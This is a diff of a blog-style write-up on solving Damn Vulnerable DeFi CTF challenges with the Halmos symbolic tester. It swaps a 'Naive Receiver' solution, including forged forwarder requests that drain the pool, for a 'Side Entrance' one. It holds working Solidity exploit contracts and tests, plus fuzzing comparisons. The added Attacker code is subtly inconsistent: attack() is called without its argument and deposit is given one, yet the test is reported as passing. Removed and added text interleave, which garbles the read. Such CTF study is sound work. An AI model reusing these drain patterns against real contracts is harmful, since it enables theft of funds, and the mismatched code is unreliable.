@@ -233,188 +233,148 @@ p_amount_uint256_b5e253c_05 = 0x000000000000000000000000000000000000000000000016
 Okay, that was pretty easy. Let's analyze a counterexample.
 ## Counterexamples analysis
 The counterexample clearly shows the sequence of what happened. 
-SideEntranceLenderPool::flashLoan was called. pool called the execute() function from our SymbolicAttacker. He, in turn, using borrowed funds (and a little of his own), put them on deposit in the same pool. flashLoan ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the Attacker simply withdrew all the funds from the deposit with the withdraw() function in the second transaction. 
+SideEntranceLenderPool::flashLoan was called. pool called the execute() function from our SymbolicAttacker. He, in turn, using borrowed funds (and a little of his own), put them on deposit in the same pool. flashLoan ended successfully, as the balance of the pool at the time of the end of flashLoan became even larger. After that, the Attacker simply withdrew all the 
+unfair funds from the  deposit with the withdraw() function in the second transaction. 
 
+Let's also pay attention to what was done in the receive() callback:
 
-
-## Counterexamples analysis
-This time we will not analyze each line of the counterexamples in detail. Note that 2 bugs were found here at once.
-The mechanics of the first bug are quite simple - we launch **flashLoan**, as the receiver we specify the **FlashLoanReceiver** contract, which we do not own, thereby emptying it by 1 **WETH** per transaction. Precisely because it takes 10 such transactions to empty this balance to 0 - Halmos failed with a clearer invariant.
-The mechanics of the second bug are very interesting. The fact is that for this we need to fulfill 2 conditions: run **withdraw** with **Forwarder** as a **msg.sender**, but at the same time bypass the concatenation of our address at the end of the **payload**:
-```solidity
-bytes memory payload = abi.encodePacked(newdata, request.from);
-...
-target.call(payload);
+```javascript
+halmos_selector_bytes4_780a835_24 = 0x00000000
+halmos_ETH_val_receive_uint256_4d032b7_19 = 0x000000000000000000000000000000000000000000000016c7c8b6b3a7640000
 ```
-```solidity
-if (msg.sender == trustedForwarder && msg.data.length >= 20) {
-    return address(bytes20(msg.data[msg.data.length - 20:]));
-}
-```
-And Halmos did find a scenario: it needs to be called from under multicall, which will allow us to withdraw on behalf of the **Forwarder** (via **delegateCall**), while withdrawing funds to an arbitrary receiver, emptying the balance of an arbitrary address, inserting it at the end of data. For this we needed the hint from **svm.createBytes()** earlier.
+Selector 0x00000000 is an ETH transfer. That is, it is simply sending a certain amount of ether back to the pool. Since this does not affect the attack in any way, this part of the counterexample can be ignored when building the attack.
 ## Using a counterexample
-Let's use the **attacker** to devastate the **FlashLoanReceiver**:
+Now, with the bug, the attack becomes obvious:
 ```solidity
 pragma solidity =0.8.25;
 
-import {NaiveReceiverPool, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
-import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract Attacker {
-    function attack(NaiveReceiverPool pool, FlashLoanReceiver receiver, WETH weth) public {
-        for (uint256 i = 0; i < 10; i++) {
-            pool.flashLoan(receiver, address(weth), 1, "b1bab0ba");
-        }
+    uint256 constant ETHER_IN_POOL = 1000e18;
+    SideEntranceLenderPool public pool;
+    uint256 public amount;
+    address public recovery;
+
+    constructor (   SideEntranceLenderPool _pool, 
+                    uint256 _amount, 
+                    address _recovery) {
+        pool = _pool;
+        amount = _amount;
+        recovery = _recovery;
     }
-} 
+
+    receive() external payable {
+    }
+
+    function execute () external payable {
+        pool.deposit(amount);
+    }
+
+    function attack(address recovery) public {
+        pool.flashLoan(amount);
+        pool.withdraw();
+        SafeTransferLib.safeTransferETH(recovery, ETHER_IN_POOL);
+    }
+}
 ```
 ```solidity
-function test_naiveReceiver() public checkSolvedByPlayer {
-    Attacker attacker = new Attacker();
-    attacker.attack(pool, receiver, weth);
+function test_sideEntrance() public checkSolvedByPlayer {
+    Attacker attacker = new Attacker(pool, 1000e18, recovery);
+    attacker.attack();
+}
+```
+Run:
+```javascript
+$ forge test --mp test/side-entrance/SideEntrance.t.sol
+...
+[PASS] test_sideEntrance() (gas: 295447)
+```
+Another Damn Vulnerable Defi challenge solved!
+## Fuzzing vs Side-entrance
+I found some solutions to this problem by fuzzing on the internet. First one is [this article](https://www.rareskills.io/post/invariant-testing-solidity) by Team RareSkills. But there is a problem with this solution: they used a Handler that was written in such a way that the Foundry fuzzer "knows" in advance what the bug is and how to exploit it. That is, they gave the fuzzer too big hint:
+```solidity
+import {SideEntranceLenderPool} from "../../src/SideEntranceLenderPool.sol";
+
+import "forge-std/Test.sol";
+
+contract Handler is Test {
+    // the pool contract
+    SideEntranceLenderPool pool;
+    
+    // used to check if the handler can withdraw ether after the exploit
+    bool canWithdraw;
+
+    constructor(SideEntranceLenderPool _pool) {
+        pool = _pool;
+
+        vm.deal(address(this), 10 ether);
+    }
+    
+    // this function will be called by the pool during the flashloan
+    function execute() external payable {
+        pool.deposit{value: msg.value}(); // !!! This line is too explicit hint
+        canWithdraw = true;
+    }
+    
+    // used for withdrawing ether balance in the pool
+    function withdraw() external {
+        if (canWithdraw) pool.withdraw();
+    }
+
+    // call the flashloan function of the pool, with a fuzzed amount
+    function flashLoan(uint amount) external {
+        pool.flashLoan(amount);
+    }
+
+    receive() external payable {}
+}
+```
+In my opinion, fuzzing through such a Handler is not enough to say that the Fuzzer is really capable of finding this kind of bugs.
+
+Another solution is made by the Crytic team and can be found [at this link](https://github.com/crytic/building-secure-contracts/blob/master/program-analysis/echidna/exercises/exercise7/solution.sol). Here the situation is much better: the solution is abstract enough and gives space for Echidna itself to find a bug. Besides, it only took a few seconds to find the bug.
+
+Let's compare how Echidna and Halmos solve the problem of "taking into account that any function can be executed inside execute()".
+
+Echidna:
+```solidity
+...
+function setEnableWithdraw(bool _enabled) public {
+    enableWithdraw = _enabled;
+}
+
+function setEnableDeposit(bool _enabled, uint256 _amount) public {
+    enableDeposit = _enabled;
+    depositAmount = _amount;
+}
+
+function execute() external payable override {
+    if (enableWithdraw) {
+        pool.withdraw();
+    }
+    if (enableDeposit) {
+        pool.deposit{value: depositAmount}();
+    }
+}
+...
+```
+We explicitly indicate which functions can be called and with which parameters. Obviously, if there was a larger setup - this code would become much more "bloated". We already saw something like this in "Truster".
+
+Now Halmos:
+```solidity
+function execute () external payable {
+    ...
+    uint256 ETH_val = svm.createUint256("ETH_val_execute");
+    address target = svm.createAddress("target_execute");
+    bytes memory data;
+    (target, data) = glob.get_concrete_from_symbolic(target);
+    target.call{value: ETH_val}(data);
     ...
 }
 ```
-Now we send all pool funds to recovery. We remember that we ignored the player's private key when testing through Halmos. The real attack, of course, requires us to craft a valid request to the **Forwarder**. This time we won't use an **attacker** contract. We don't want to transfer our private key to some contract :)
-```solidity
-function test_naiveReceiver() public checkSolvedByPlayer {
-...
-    bytes[] memory callDatas = new bytes[](1);
-    callDatas[0] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
-        bytes32(uint256(uint160(deployer)))
-    );
-    bytes memory callData;
-    callData = abi.encodeCall(pool.multicall, callDatas);
-    BasicForwarder.Request memory request = BasicForwarder.Request(
-        player,
-        address(pool),
-        0,
-        30000000,
-        forwarder.nonces(player),
-        callData,
-        1 days
-    );
-    bytes32 requestHash = keccak256(
-        abi.encodePacked(
-            "\x19\x01",
-            forwarder.domainSeparator(),
-            forwarder.getDataHash(request)
-        )
-    );
-    (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
-    bytes memory signature = abi.encodePacked(r, s, v);
-    require(forwarder.execute(request, signature));
-}
-```
-Since we crafted the request ourselves, because we couldn't use calldata from Halmos for obvious reasons - I just copied this request from [here](https://medium.com/@opensiddhu993/challenge-2-naive-receiver-damn-vulnerable-defi-v4-lazy-solutions-series-8b3b28bc929d) by [@siddharth9903](https://github.com/siddharth9903) :).
-
-```javascript
-$ forge test -vv --mp test/naive-receiver/NaiveReceiver.t.sol
-...
-Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 2.53ms (1.50ms CPU time)
-```
-Did it!
-## Compare with fuzzing
-We can find foundry-based, echidna-based and meduza-based solutions to this problem [here](https://github.com/devdacian/solidity-fuzzing-comparison/tree/main/test/01-naive-receiver).
-However, I haven't found any solutions for the updated version of Naive-receiver (v4). The fact is that a second bug was added in the new version, which is tied precisely to the calldata craft and in **"Truster"** it almost became a blocker. Therefore, let's check whether there are fuzzers at all are able to work out the following logic.
-### Target
-First, write this POCTarget contract:
-```solidity
-// SPDX-License-Identifier: MIT
-
-pragma solidity =0.8.25;
-
-contract POCTarget {
-    uint256 public a;
-    
-    constructor() {
-        a = 0;
-    }
-
-    function proxycall (bytes calldata data) public {
-        address(this).call(data);
-    }
-
-    function changea () public {
-        if (msg.sender != address(this)) {
-            revert();
-        }
-        if (address(bytes20(msg.data[msg.data.length - 20:])) == address(this)) {
-            a = 1;
-        }
-    }
-}
-```
-If the fuzzer supports such logic, it will find a counterexample where a==1.
-### Foundry
-```solidity
-// SPDX-License-Identifier: MIT
-
-pragma solidity =0.8.25;
-
-import "./POCTarget.sol";
-import {Test, console} from "forge-std/Test.sol";
-
-contract POCFuzzing is Test {
-    POCTarget target;
-    address deployer = makeAddr("deployer");
-
-    function setUp() public {
-        startHoax(deployer);
-        target = new POCTarget();
-        vm.stopPrank();
-        targetSender(deployer);
-    }
-
-    function invariant_isWorking() public {
-        assert (target.a() != 1);
-    }
-}
-```
-```javascript
-$ forge test -vv --mp test/naive-receiver/POCFuzzing.t.sol
-...
-[PASS] invariant_isWorking() (runs: 1000, calls: 500000, reverts: 249958)
-```
-Not working
-### Echidna
-```javascript
-deployer: '0xcafe0001' 
-sender: ['0xcafe0002']
-allContracts: true
-workers: 8
-```
-```solidity
-// SPDX-License-Identifier: MIT
-
-pragma solidity =0.8.25;
-
-import "./POCTarget.sol";
-import {Test, console} from "forge-std/Test.sol";
-
-contract POCFuzzing is Test {
-    POCTarget target;
-    address deployer = makeAddr("deployer");
-
-    constructor() public payable {
-        target = new POCTarget();
-    }
-
-    function echidna_isWorking() public returns (bool) {
-        return target.a() != 1;
-    }
-}
-```
-```javascript
-echidna test/naive-receiver/POCEchidna.t.sol --contract POCEchidna --config test/naive-receiver/naive-receiver.yaml --test-limit 10000000
-...
-echidna_isWorking: passing
-...
-```
-Also not working. I think these results are enough to prove that Foundry and Echidna fuzzing would not cope with the new bug.
+It is easy to see that the Halmos code provides a better abstraction for such cases and do a better job in the case of setup expanding.
 ## Conclusions
-1. Path explosion is a really serious problem of symbolic analysis. We had a setup of 4 not the largest contracts, but Halmos was unable to complete 2 transactions symbolically without serious simplifications.
-2. You can and should use simplifications and optimizations. Sometimes nothing will work without it. The main thing is to choose heuristics successfully.
-3. When creating invariants, you can follow the principle "If we can do something UNEXPECTED - we will easily find a full-fledged attack".
-4. It is important to understand when it is better to use **svm.CreateCalldata()** and when to use **svm.createBytes()**. Each has its own unique areas of application.
-5. Even given that we gave a strong hint that **svm.createBytes()** should be used at **withdraw->_msgSender()** function, Halmos did a great job of handling the raw calldata to find a bug, unlike Echidna and Foundry. The new version of Naive-receiver is not completely solved by fuzzing.
+1. Using already accumulated techniques and principles, we solved the next Damn Vulnerable Defi challenge with Halmos quite easily. Every step was obvious and self-explanatory.
+2. Adapting the test to a specific contract is a good idea. For example, in this challenge we adapted to use native ETH.
+3. We confirm again the conclusions we made earlier: in the case of a small setup, fuzzing really seems to be a very effective tool, even if it is necessary to use some transaction abstraction. However, fuzzing engines do not have convenient abstraction mechanisms, so if target contracts are tied to some logic of abstract calls, Halmos looks much more convenient and powerful.
